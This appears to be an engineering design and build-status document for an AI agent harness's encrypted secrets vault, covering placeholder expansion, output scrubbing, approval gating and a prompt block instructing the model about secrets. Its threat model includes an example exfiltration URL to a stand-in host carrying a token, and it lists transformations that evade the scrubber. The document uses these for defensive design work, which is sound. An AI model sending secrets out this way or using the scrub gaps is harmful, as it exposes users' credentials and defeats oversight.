`Vault::open(&data_dir, &cfg)` from the `secrets:` section of the same
Figment `main` builds; exit 0/1; nothing printed but the receipt
`stored NAME v2`. This is how a node (32 §5.1) gets its `anthropic` key
after `--install-service`, and how any user scripts a rotation
(`gh auth token | wth --secret-set github`).

## 4. Prompting

`RegisterPrompt { plugin: "secrets", text }` at start when
`secrets.tools` (the `computer` shape, `computer/src/lib.rs:164-176`).
Static, ≈200 tokens:

```
## Secrets
Named secrets (API keys, tokens, passwords — including the harness's own provider keys) live in an encrypted vault you can use but never read. `secret_list` names them with their versions. Write `{{secret:NAME}}` inside any tool argument — a shell command, a header, a URL, file content, an MCP tool's field — and the harness swaps in the value when the tool runs; you, the transcript and the user's approval card see only the placeholder, and the value is scrubbed from tool output if it echoes back. `{{secret:NAME:-1}}` is the previous version (a token you just rotated). In Python keep the placeholder in a plain string, not an f-string (`{{` becomes `{`). Need a secret that does not exist? `secret_request` asks the user to type it into a masked field; `secret_capture` runs a tool and stores its output (a fresh token from a login command, a key from a file) without showing it to you — `replace: true` to update one that exists; `secret_restore` undoes a bad update. Never ask the user to paste a secret into the chat, and never try to print one.
```

`harness.md` loses the `credentials.yaml` row and gains `secrets.vault` /
`secrets.key` rows in the layout table, one line under `## config.yaml`,
and under "Only the user can": *see a secret's value, add one from the
keyboard, or delete one*.

## 5. TUI (`crates/tui`)

- **`/secrets`** → `Menu::Secrets { list: SecretsList, cursor, history:
  Option<usize> }`, title `secrets · key: keychain`, rows
  `NAME · v7 (3 kept) · note · updated`. Keys: `a` add, `r` replace value
  (a new version), `h` history (rows `v7 · 2026-09-16 10:02 · user ·
  current`, `v6 · … · shell`; Enter restores the selected one, `d` on the
  list deletes the name after a confirm), Esc close. `/secrets add [name]`,
  `/secrets rm <name>`, `/secrets restore <name> [back]` skip the menu.
  `COMMANDS` gains `("/secrets", "[add [name]|rm <name>|restore <name> [n]]",
  "encrypted secrets the agent uses by name")`.
- **Adding / replacing** rides the input box as `Prompt` steps (the
  `/provider add` flow, `model.rs:1261-1335`): `Prompt::SecretName` →
  `Prompt::SecretValue { name, current: Option<u32> }` →
  `Prompt::SecretNote { name, value }`. The value step sets `masked:
  true`; `ui.rs:402-411` passes `mask: Some('•')` to `TextInput` (iocraft
  patch, §2). Hint line reads `secrets add  NAME  value  (replaces v3 →
  v4; esc cancel)` when the name exists. `prompt_submit` pushes
  `Entry::Info("NAME: v4 set")`, never the value; the existing leak test
  (`model.rs:5927-5948`) gets a `secret` case. Paste works (bracketed
  paste lands in the same editor). `sync_slash` stays suppressed while a
  prompt is open. `/provider add`'s key step reuses `masked: true` — the
  one behaviour change to an existing flow, and an improvement.
- **`SecretsEvent::Requested`** → a modal box in the approval box's place
  (`ui.rs:330`; approvals take precedence, 02 §4):

  ```
  ╭ secret requested ───────────────────────────────╮
  │ GITHUB_TOKEN — GitHub PAT with repo scope       │
  │ (adds v4; v3 stays as {{secret:GITHUB_TOKEN:-1}})│
  │ ••••••••••••••••••••▏                            │
  │ enter store · esc decline                       │
  ╰─────────────────────────────────────────────────╯
  ```

  Enter → `answer_secret(id, Some(value))`; Esc → `answer_secret(id, None)`.
  The card in the transcript is the `secret_request` tool card; its result
  line is the receipt.
- **Print mode** (`-p`): no editor, so a request waits for
  `request_timeout_secs` like `ask_user` does today; the model then sees
  `no answer`.
- Tool cards need nothing: `describe` shows `{{secret:NAME}}` because that
  is what the model wrote.

## 6. Desktop (`crates/desktop/ui`)

- Settings tab `['secrets', 'Secrets', Lock]` in `TABS`
  (`SettingsDialog.tsx:39-53`); pane `<Secrets />` in
  `components/settings/Secrets.tsx` built from `shared.tsx`'s `Section`,
  `Row`, `Empty`, `useAction`: header shows `key: keychain|file`, one `Row`
  per secret (name, `v7 · 3 kept`, note, updated) with Replace, History
  (expands to the version rows, each with Restore) and `Trash2`; a form
  `name · <Input type="password" autoComplete="off"> · note · Add` — the
  `Gateways` form (`Connections.tsx:118-206`) with one more column.
  `queryKeys.secrets`, `useInvalidateOn('SecretsEvent', …)`. The
  `Gateways` form keeps working; its key lands in the vault.
- `SecretsEvent.Requested` → `SecretRequestCard.tsx` beside
  `ApprovalCard.tsx`: name, note, "adds v4; v3 stays reachable" when
  `current` is set, password input, Store / Decline → `answer_secret`.
  Resolved or timed out → the card collapses to the receipt.
- `rpc/api.ts`: five methods in `interface Api` and `METHODS`
  (`api.test.ts` checks them against `bindings/methods.json`). Types from
  `bindings/` after `just ts-desktop`.
- A phone through the relay gets the same pane over `LinkTransport`
  (`App.tsx:304`); `set_secret` rides the Noise channel.

## 7. Slack, Signal, ACP, nodes

- **Slack / Signal**: subscribe `SecretsEvent::Requested`; for a session (or
  ancestor, 24 §2) bound to a thread, post one line: *wth asks for secret
  `NAME` — note. Enter it in the desktop app, the TUI (`/secrets add
  NAME`) or `wth --secret-set NAME`; it will not be read from this chat.*
  Nothing is answerable in-channel: the value would sit in Slack's
  history. A session born from a non-owner principal (28 §5) can *use*
  placeholders; the gate rule (§0.4) makes every such call an approval
  that reaches the owner.
- **ACP children** (`acp_child.rs`) do not route tool calls through
  `Invoke`; an external harness sees `{{secret:NAME}}` as literal text.
  Secrets are a wth capability; not extended to foreign harnesses in v0.
- **Nodes** (32): a subagent on another machine runs in *that* wth, whose
  placeholders resolve against *that* vault, filled with `--secret-set`
  on that box. Nothing crosses the link.

## 8. Security

Threat model, in 28's letters: the model (A-driven) has B (private data)
and C (egress) through tools; this doc adds a new B — the vault, now
holding the harness's own keys too — and must not add a path from it to C
that the gate does not see.

- **No read path.** No tool, RPC method or event carries a value except
  `set_secret`/`answer_secret` *inbound*. `SecretInfo` has no length.
  `Handle` is in-process Rust (§3.7).
- **Placeholders never leave the args.** Expansion mutates a clone inside
  `invoke`; the expanded `Value` is dropped after `tool.call`. Events,
  approvals, history, the desktop store hold the model's args. The one
  expanded string that outlives `invoke` — a job's `command` — reaches the
  shell and nothing else: `Jobs::Start`/`StartPty` scrub it at admission
  (§3.4).
- **Gate.** §0.4. Before 28: `mentions → Ask` before the switches. After
  28: `mentions` joins `spec.sink` in `consequential`; a tainted session's
  placeholder call is `Ask` that only `/yolo` rewrites. The approval card
  already shows args verbatim (`describe`), so the human sees
  `url: https://x.evil/?t={{secret:GITHUB_TOKEN}}`.
- **Old versions are still secrets.** A rotated token may still be valid
  at the issuer for a while; every kept version is in the scrub set and
  reachable only through `:-N`. `KEEP = 5` bounds how long.
- **Scrub, and its ceiling.** Exact and base64 forms of every kept value
  ≥ 8 chars, at the four sites in §3.4. Not caught: values transformed
  (`rev`, hex, chunked `${T:0:10}`), values under 8 chars, a value split
  across two live job chunks (the final `render` pass catches it before
  the model sees it; only the live TUI tail and the log file can hold the
  halves). The scrub is for accidents; the gate is the control.
- **Process visibility.** A placeholder in `shell.command` puts the value
  on an external process's argv, visible to the same user in `ps`.
  Equivalent to today's `credentials.yaml` readability; the same user is
  already trusted. `# ponytail: argv exposure; per-call env injection via
  brush Shell::env_mut().set_env_global in ShellTool::call (needs the value
  on ToolCx) if a transcript shows it matters`.
- **Disk.** `secrets.vault` is ciphertext; `read_file` on it is harmless.
  With `key_store: file`, `read_file ~/.wth/secrets.key` is one `ReadOnly`
  call — the doc says so, `/secrets` shows `key: file`, and the user chose
  a server without a keychain. Scrubbed job logs and spill files hold
  placeholders, not values. `write_file` with an expanded placeholder puts
  a real value where the model asked (a `.env`); that is the user's
  machine and the model's declared intent on the approval card. A python
  cell that reads such a file into a variable without printing it holds
  the value in the sandbox heap, and the heap is dumped to
  `runtime/<session>.monty` (`repl.rs:632-636`) — plaintext on the user's
  disk, never in the frame; scrubbing applies when it is printed.
- **The harness's own keys.** Before: `credentials.yaml`, plaintext,
  `read_file`-able, `edit`-able, `cat`-able into the frame. After:
  ciphertext, usable by the model only through a placeholder that asks,
  replaceable only as a new version. Strictly better on every axis the
  28 table names.
- **Import.** The one moment plaintext and ciphertext coexist is inside
  `Vault::open`; the file is unlinked in the same call after the vault is
  fsynced. A crash between the two leaves both; the next start imports
  again (idempotent: same values → the vault already has them as v1, no
  new version is written when the top value is equal).
- **Memory.** `Zeroizing<String>` for stored values; the expanded args
  `Value` and inner-capture output are ordinary `String`s dropped at once.
  Not defended: a core dump.
- **Multi-process.** mtime reload; no locking. Two writers within one
  second can lose one write. Secrets are entered by hand or by one
  capture at a time; acceptable.
- **Phones.** `set_secret` from a paired device is the same trust as
  `add_provider` today (§1 table); the relay copies ciphertext (31).

## 9. Config

```yaml
secrets:                       # design doc 37; `/secrets`, Settings › Secrets, `wth --secret-set`
  key_store: auto              # auto | keychain | file — where the vault key lives; auto = keychain when one answers, else <data_dir>/secrets.key (0600) with a warning
  tools: true                  # false: no secret_* tools, no prompt block, `{{secret:…}}` stays literal, nothing is scrubbed; the vault, /secrets and the harness's own keys are unaffected
  request_timeout_secs: 1800   # `secret_request` gives up (the model sees "no answer") after this
```

No `enabled`: the vault is where the provider keys live, so a harness
without it has env-var and `/login` auth only — that is what a failed key
store gives you (§3.3), with a log line and a `/secrets` header saying so,
not a switch. `tools: false` is the agent-facing off switch and passes
plugins.md §1's test ("turn it off and still have a working harness").
`WTH_SECRETS__KEY_STORE=file` as everywhere. `DEFAULT_CONFIG` in
`wth/src/main.rs` and the README config list gain the section, commented.

## 10. Data on disk

| path | truth or derived | contents |
|---|---|---|
| `secrets.vault` | truth | one encrypted blob, §3.5, incl. the provider keys; delete = forget every secret |
| `secrets.key` | truth (file key store only) | 32-byte key, base64, 0600; delete = the vault is unrecoverable |
| keychain `wth / secrets:<data_dir>` | truth (keychain key store) | same key; `security delete-generic-password -s wth` = the vault is unrecoverable |
| `credentials.yaml` | **gone** | imported and unlinked at the first start with this crate (§3.6) |
| `jobs/<session>/<id>.log`, `spill/…`, `messages.body` | derived (agent, tools) | now hold `{{secret:NAME}}` where a value echoed; unchanged otherwise |

Rejected: a row per secret in a sqlite file with per-row encryption — a
schema and a migration for a map of tens of entries; the whole-blob rewrite
is one `rename`.

## 11. Extension: backends (v1 contract, not v0 code)

What v1 adds, so v0 reserves the names and nothing else:

```rust
// crates/secrets/src/lib.rs, v1
#[async_trait::async_trait]
pub trait Backend: Send + Sync {
    /// Namespace: `{{secret:<id>/NAME}}`. `[a-z0-9-]+`.
    fn id(&self) -> &'static str;
    async fn list(&self) -> Result<Vec<SecretInfo>, String>;                 // source = id()
    /// `back` as in the placeholder; a backend without history answers Err for back > 0.
    async fn get(&self, name: &str, back: u8) -> Result<Option<Zeroizing<String>>, String>;
    /// Err("read-only") is a valid answer; `secret_capture` and the UI say so.
    async fn set(&self, name: &str, value: &str, note: &str) -> Result<(), String>;
    async fn delete(&self, name: &str) -> Result<(), String>;
}
/// `ask` → `()`. Replaces a backend with the same id (the `RegisterUserSink` shape).
pub struct RegisterBackend(pub Arc<dyn Backend>);
pub struct UnregisterBackend(pub &'static str);
```

- The local vault becomes the `Backend` with id `local`, and an unprefixed
  name means `local/`. The actor holds `Vec<Arc<dyn Backend>>`; `expand`
  resolves `<id>/NAME` by id, `secret_list` concatenates, `source` tells
  them apart. `Handle` stays local-only: the harness's own keys do not
  come from a network.
- A backend plugin (`crates/bitwarden`: `bitwarden:` config section with
  server URL, client id, org/collection filter, poll interval) sits above
  `secrets` in the dependency order and below `rpc`; its own client secret
  is `{{secret:bitwarden-client-secret}}` in the local vault — the local
  vault is the root of trust and is never replaced.
- Values fetched from a backend during `expand` join the redaction
  automaton for the life of the process. `list` results are cached per
  backend and refreshed on its own schedule; `get` is live.
- Nothing in v0 changes for v1 except: `Vault` gains `impl Backend`, the
  actor's `vault: Arc<Vault>` field becomes `backends: Vec<Arc<dyn
  Backend>>` seeded with it, and `expand`'s name parser splits on `/`. The
  parser's `/` reservation, `back` in the API and `SecretInfo.source` are
  the only v0 provisions.

## 12. Not built, and when

- **Per-session or per-agent scoping.** Secrets are global like
  `credentials.yaml` was; a subagent sees what its parent sees. A
  `hidden`-style per-session set (`registry.rs:29-50`) is the shape if a
  user wants a secret only some sessions may use.
- **`secret_set` / `secret_delete` tools.** §0.5.
- **`oauth/` into the vault.** Tokens are rewritten by refresh on a
  timer (05), not entered by anyone; `oauth::Store` is a library below
  `tools`. Moving them means the library takes a `Vault` — a small change
  once §3.6 has shipped and settled, not in the same series.
- **More than five versions, or a configurable count.** `KEEP` is a
  const; a transcript that needs six changes the number.
- **Env injection for `shell`/`start`.** §8 "Process visibility".
- **Transformed-value scrubbing** (hex, url-encoding, chunking). Add a
  pattern when a transcript shows one; never a heuristic scanner.
- **ACP children and secrets.** Would need the external harness to send
  its tool calls through our registry; that is 06's problem.
- **Slack/Signal answering `secret_request` in-channel.** A Slack modal
  (Block Kit `input` with no message) is possible; a Signal text is not.

## 13. Build steps, each with its check

Estimated crate: `lib.rs` (config, actor, events, plugin) ≈ 320 lines,
`vault.rs` ≈ 260 incl. tests (versions, import), `key.rs` ≈ 80,
`tools.rs` ≈ 260; `tools/src/secrets.rs` ≈ 130 + ≈ 20 lines of call
sites; `wth/src/secret_cli.rs` ≈ 80; consumer edits ≈ 60 lines net
negative (the YAML rewriters go).

1. **Vault + key + import** (`crates/secrets/src/{vault,key}.rs`). Encrypt
   / decrypt round trip, wrong key → error, tampered byte → error, five
   versions kept and `v` monotonic after ten sets, `get(name, 4)` after
   five sets is the first value and `get(name, 5)` is `None`, restore
   pushes a copy and keeps history, mtime reload, redaction automaton
   (exact + base64, all versions, min length, longest match, `:-N`
   replacement text), `credentials.yaml` import is idempotent and unlinks.
   Check: `cargo test -p secrets`; `keyring` on macOS creates the item
   once and a second run does not prompt; `WTH_SECRETS__KEY_STORE=file` on
   a Linux box with no D-Bus writes `secrets.key` 0600.
2. **Credentials cutover.** `Handle`; agent `Auth.vault`, live resolver,
   `configured`, gateways via the actor; `web`, `search-providers`,
   `slack` read through `Handle`; `--slack-setup` through `Vault::open`;
   `runtime::credentials`, `DEFAULT_CREDENTIALS`, the two YAML rewriters
   and their tests deleted; `--secret-set/-rm/-list`. Check: a data dir
   with a real `credentials.yaml` (`anthropic`, `firecrawl`, `slack_bot`)
   starts, logs the import, the file is gone, `/model` still lists
   anthropic, `search_web` still uses Firecrawl, Slack still connects;
   `printf %s "$KEY" | wth --secret-set openai --data-dir /tmp/wth-x` then
   `/model` in the running TUI lists openai without a restart;
   `/provider add` round-trips and `wth --secret-list` shows the gateway
   name.
3. **`tools::secrets` hook + registry sites** (`tools/src/secrets.rs`,
   `registry.rs`). Check, headless on a scratch data dir: `set_secret("T",
   "abcdefgh0123")`, `set_secret("T", "ABCDEFGH4567")`; `shell{command:
   "printf %s '{{secret:T}}' | wc -c"}` → `12`; `shell{command: "echo
   {{secret:T}} {{secret:T:-1}}"}` → `ToolCallFinished.output ==
   "{{secret:T}} {{secret:T:-1}}\nexit code: 0"`,
   `ToolCallStarted.args.command` still has the placeholders,
   `ApprovalRequested.args` too, `messages.body` for the turn has neither
   value; `read_url` with a placeholder in `headers` under `/approvals on`
   asks; `shell{command: "echo {{secret:T:-2}}"}` → error, nothing ran (no
   `JobEvent::Started`); `echo {{secret:anthropic}}` → the placeholder.
4. **Jobs, python, MCP sites.** Check: a job past `job_grace_secs`
   echoing the value → `jobs/<session>/<id>.log` and `<job_result>` hold
   the placeholder; `python{code: "print(open('/cwd/.env').read())"}`
   after `write_file{content: "T={{secret:T}}"}` → placeholder; an
   `mcp/*.json` with `"headers": {"Authorization": "Bearer {{secret:T}}"}`
   connects (a local echo server logs the real header).
5. **Tools + prompt block.** Check: `secret_capture{name: "R", tool:
   "shell", args: {command: "openssl rand -hex 16"}}` → `stored R v1 (32
   bytes) from shell`, the same again → error naming `replace`, with
   `replace: true` → `stored R v2 … v1 is {{secret:R:-1}}`,
   `secret_restore{name: "R", back: 1}` → `R v3 = v1 restored`, `printf
   %s '{{secret:R}}' | wc -c` → 32 and equals `{{secret:R:-2}}` (`test
   "{{secret:R}}" = "{{secret:R:-2}}" && echo same` → `same`); the
   transcript has no hex; `secret_capture` with `pattern: "token=(\\S+)"`
   on `printf token=xyz…`; `secret_capture` on a failing command → error,
   output withheld; `/prompt` shows the block.
6. **RPC + TUI.** iocraft `mask` patch; `/secrets`, `a`/`r`/`h`/`d`; the
   request modal; `/provider add` key step masked. Check on a real pty
   (`pyte`, 02 §7): typing during the value step renders `•`; the leak
   test extended with a `secret` case passes; `secret_request` from a
   real model round-trips to `stored NAME v1`; `h` on a rotated secret
   lists the versions and Enter restores one.
7. **Desktop.** Settings › Secrets with history/restore,
   `SecretRequestCard`. Check: browser tab against the dev daemon — add,
   replace, restore, delete update the list on `SecretsEvent.Changed`; a
   `secret_request` shows the card, Store resolves the tool card; the
   phone build over the relay adds one; Settings › Connections still adds
   a gateway.
8. **Slack/Signal line, docs, wiring.** `main.rs` vector line after
   `tools` (order is convention only; the agent finds the vault by
   `lookup_when`); `DEFAULT_CONFIG`; README crate list and config
   bullets (the `credentials.yaml` bullet becomes the vault's);
   `harness.md`; 00 amendments (§14); 01 §1.3 and 05 §3 rewritten.
   Check: `cargo check --workspace --all-targets` (0 warnings), `clippy -D
   warnings`, `cargo test --workspace`, `cargo check -p rpc --features
   ts`, `just ts` produces `SecretsEvent.ts`; `secrets.tools: false` →
   `list_tools` has no `secret_*`, a `{{secret:T}}` in `shell` runs
   literally, `/model` still lists the vault's providers.

## 14. Amendments to `00-architecture.md` and siblings

- 00 §4 permission gate: after "`Risk → PolicyAction` from `tools.policy`":
  *a call whose arguments carry a `{{secret:…}}` placeholder resolves to
  at least `Ask` before the two switches apply (37 §0.4); 28 folds this
  into `consequential`.*
- 00 §4 tool contract: *`tools::secrets` is the one hook between the gate
  and `tool.call`: placeholder expansion in, value scrubbing out (37
  §3.4). No other middleware exists; a second one amends this sentence
  first.*
- 00 §5 agent: *provider keys come from the secrets vault through
  `secrets::Handle`, read per request (37 §3.6); `credentials.yaml` is
  gone.*
- 00 §6 shell: *job output is scrubbed of vault values per chunk and once
  whole before it reaches the log, the bus or the model (37 §3.4).*
- 00 §9 data dir: replace `credentials.yaml` with `secrets.vault`
  (encrypted vault: provider keys, web keys, Slack tokens, the user's
  secrets — 37) and `secrets.key` (only without a keychain).
- 00 §10 crate table:
  `  secrets/            plugin: encrypted versioned vault (provider keys included), keychain key, {{secret:NAME[:-N]}} expansion + output scrub hook, secret_* tools, masked request, --secret-* CLI (37)`;
  dependency order: `runtime ← tools ← secrets ← knowledge ← agent …`
  (`web`, `search-providers`, `agent`, `slack`, `rpc`, `signal` depend on
  `secrets`; `agent` calls `tools::secrets::redact` from `tools`).
  Workspace deps table:
  `| keyring | 3 | vault key in the OS keychain (37) |`,
  `| chacha20poly1305 | 0.10 | vault encryption (37; already transitive via snow) |`,
  `| zeroize | 1 | secret values in memory (37) |`,
  `| aho-corasick | 1 | one-pass output scrub (37; already transitive via regex) |`,
  `| rpassword | 7 | --secret-set without echo (37) |`.
  `runtime/` row: drop "credentials" from its description.
- 00 §12 phases: row 23 — `secrets (37)` | *a `shell` echoing `{{secret:T}}`
  shows the placeholder in every frontend and in `messages.body`;
  `secret_capture` stores a token the transcript never contains; a
  rotated key is reachable as `:-1` and restorable; a data dir with
  `credentials.yaml` starts with the file imported and gone; a placeholder
  in `read_url` asks* | planned.
- 00 §13 returned-as table: not a jarvis subsystem; nothing to add.
- `01-config-and-subagents.md` §1.3: retitle *`secrets.vault`
  (credentials)*; the body becomes: *Provider keys are secrets in the
  encrypted vault of doc 37, under the genai adapter names (`anthropic`,
  `openai`, …) plus gateway names, web keys and Slack tokens. Enter them
  with `/secrets add`, Settings › Secrets, `/provider add`, or `wth
  --secret-set <name>` on a box without a UI. Precedence: vault beats
  `/login` beats env. An existing `credentials.yaml` is imported and
  removed on the first start.* The `credentials.yaml` row of the §1.1
  layout tree becomes `secrets.vault`. The keychain rejection paragraph
  is deleted; 37 §0.6 holds the argument.
- `05-oauth.md` §3 precedence: `credentials.yaml` → *the secrets vault (37)*.
- `16-web.md` §6, `21-slack.md` (tokens), `32-nodes.md` §5.1 (how a node
  gets its key): one sentence each pointing here.
- README: the `credentials.yaml` bullet becomes the vault bullet; crate
  list; `TUI:` paragraph gains `/secrets`; the quick-start's
  `export ANTHROPIC_API_KEY=…` line gains `# or: wth --secret-set anthropic`.

## 15. Status (as-built, 2026-09-16)

Built the same day in two parallel waves (vault + plugin + `tools` hook +
iocraft patch + RPC + docs; then agent/consumer cutover, binary + CLI, TUI,
desktop) plus three corrective passes from the smoke. Gates: `cargo check
--workspace --all-targets` 0 warnings, `clippy -D warnings`, `cargo test
--workspace` (secrets 8, tools 80 incl. `quiet_job_is_invisible`, agent 38,
TUI leak tests extended), `cargo check -p rpc --features ts`, `just
ts-desktop` (`SecretInfo/VersionInfo/SecretsList/SecretsEvent/RequestId.ts`),
`tsc -b`, vitest 102/102.

### 15.1 What the build changed

- **Event wire names.** `SecretsEvent::Changed` collided with
  `ScheduleEvent::Changed` on the `{"type": …}` stream (found by the desktop
  slice). Variants are `#[serde(rename)]`d to `SecretsChanged`,
  `SecretRequested`, `SecretResolved` (§3.3).
- **Two scrub sites the §3.4 table missed**, both found by the smoke:
  `Jobs` published the *expanded* `command` in `JobEvent::Started/Finished`
  (and `<job_result command=…>` would have carried it into the frame) — the
  command is now scrubbed once at admission, the real string reaches only
  `run_string`; and `secret_capture`'s inner shell published its fresh
  value through `JobEvent::Output/Finished` before the vault knew it —
  `ToolCall.quiet` / `ToolCx.quiet` now makes such a job publish nothing,
  write no log, take no `jobs` row and wait for completion (§3.2, §3.4).
- **`secrets::handle(rt)`** with `HANDLE_WAIT = 10 s` replaces an unbounded
  `lookup_when` in `web`, `search-providers`, `slack`: a vault that failed
  to open no longer stops keyless engines or Slack from starting (§3.6).
  The agent uses a synchronous `ActorRef::lookup` at its start instead
  (plugins start in vector order and `secrets` precedes `agent` in both
  vectors of `main.rs`; a `None` vault = env/`/login` auth only). Both
  are a documented dependence on vector order that plugins.md §3.2
  discourages; the alternative (`lookup_when` forever) hangs startup when
  the vault is broken.
- **pty screens** are scrubbed at `PtyHandle::screen()` — the one source
  for the `screen` tool, `JobView.tail`, `JobEvent::Screen` and a pty
  job's final `<job_result>` (§3.4 said `screen` was covered by `invoke`
  alone; the tail and the event were not).
- `secret_cli::run` is synchronous (nothing awaits). `restore` with
  `back` outside `1..=4` is its own error text. `set` with the current
  value is a no-op even when the note differs. `zeroize` needs its
  `serde` feature for the on-disk versions. `keyring` under `Auto` falls
  back to the file only on a `keyring::Error`; a corrupt keychain item is a
  hard error, not a silent fallback that would strand the vault.
- Prompt block is registered without its `## Secrets` heading (the harness
  owns headings, plugins.md §3.5.1).

### 15.2 Smoke (real binary, real model, scratch data dir, `key_store: file`)

- `credentials.yaml` with `anthropic` + `firecrawl` → first `--secret-set`
  imported both (`source: import`), unlinked the file; `secrets.vault` and
  `secrets.key` are 0600; the vault bytes contain no key material.
  `--secret-set openai` from piped stdin → `stored openai v1`;
  `--secret-list`; `--secret-rm`.
- Headless daemon started with `ANTHROPIC_API_KEY` **unset**: the model
  authenticated from the vault (live resolver). `list_secrets`,
  `set_secret` ×2 → `T v2` with `versions 2:user,1:user`; `list_tools` has
  the four `secret_*` tools, all `read_only`.
- Turn "echo `{{secret:T}} {{secret:T:-1}}`" (approvals on): the model went
  python → shell; `ApprovalRequested.args.command` and
  `ToolCallStarted.args` carried the placeholders; `ToolCallFinished.output`
  = `{{secret:T}} {{secret:T:-1}}\nexit code: 0`; the reply was the two
  placeholders; `messages.body` has 0 rows with either value, 6 with the
  placeholder; no plaintext copy anywhere in the data dir outside the vault.
- `secret_capture` ×2 (`replace: true`) + `secret_restore back:1` +
  `secret_list`: receipts exactly as §3.2; versions `3:restore v1, 2:shell,
  1:shell`; after the `quiet` fix a capture running 4 s (past
  `job_grace_secs`) published no `JobEvent`, wrote no log, and
  `printf %s '{{secret:R2}}' | wc -c` → 32.
- `read_file{path: "/tmp/{{secret:T}}"}` with approvals on → asked
  (`risk: read_only`), card showed the placeholder, deny honoured.
- `secret_request{name: GH}` → `SecretRequested` on the stream,
  `answer_secret` over RPC → `SecretResolved{stored: 1}`, receipt `stored
  GH v1`; then `python: r = await shell("printf %s '{{secret:GH}}' | base64")`
  → the base64 form came back as `{{secret:GH}}` (14 chars).
- TUI on a 120×40 pty (pyte): `/secrets` menu with `key: file`, `a` →
  name → value step renders `•••••••••••••••` for 15 typed chars → note →
  `SMOKE_TUI: v1 set`; `h` history view; the typed value never appeared on
  screen.

Not exercised: `key_store: keychain` (the macOS prompt needs a hand on the
box; §2's ACL claim is from `keyring`'s docs); the desktop panes and
`SecretRequestCard` beyond `tsc`/vitest (no Tauri session driven); Slack and
Signal notices; `{{secret:…}}` in `mcp/*.json` headers against a live
server; `WTH_SECRETS__TOOLS=false`; two writers racing on one vault.
